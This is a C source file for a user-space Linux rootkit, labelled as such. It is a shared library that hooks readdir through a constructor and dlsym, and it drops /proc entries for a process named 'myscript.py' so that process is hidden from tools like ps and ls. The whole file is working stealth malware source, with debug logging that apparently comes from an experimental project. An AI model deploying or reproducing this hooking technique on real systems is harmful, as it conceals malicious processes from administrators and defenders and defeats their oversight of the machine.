// rootkit for hiding the rootkit processes
#define _GNU_SOURCE

#include "urd00m_output.h"
#include <dlfcn.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>

#define HIDE_NAME "myscript.py"
struct dirent* (*orig_readdir)(DIR*) = 0;

// get directory name
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

// Get process name
static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);

    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

// LS hijack of readdir
struct dirent* readdir(DIR* dirp) {
	INFO("My readdir hit\n");

	struct dirent* orig_read;
	
	// Hide our process
	while(1) {
	  orig_read = orig_readdir(dirp); 
	  if(orig_read) {
	    char directory_name[256];
	    char process_name[256];
	    int dir_status = get_dir_name(dirp, directory_name, sizeof(directory_name));
	    int proc_status = get_process_name(orig_read->d_name, process_name);
	    if(dir_status && proc_status && strcmp(directory_name, "/proc") == 0 && strcmp(process_name, HIDE_NAME) == 0) {
	      FATAL("inside %s %s\n", directory_name, process_name);
	      continue; // chose a different one 
	    }
            if(orig_read->d_name) {
              FATAL("Hit %s \n", orig_read->d_name);
            }
	  }
	  break; // We can return this one 
	}

	return orig_read;
}

// Sets up shims
int setup_shims(void) {
        #define SHIMIFY_ERR(x)  if ( !(orig_##x = dlsym(((void *) -1l), #x)) ) { \
                                fprintf(stdout, "Failed to setup SHIM for " #x "\n"); \
                                return -1; \
                                }
  //    SHIMIFY_ERR(malloc);
  SHIMIFY_ERR(readdir);
  return 0;
}

static __attribute__((constructor)) void processor_kit_init(void) {
  INFO("Init of rootkit2.so\n");
  if(setup_shims() == -1) {
    ERROR("Failed to setup shims\n");
  }
  INFO("Init succeeded\n");
}
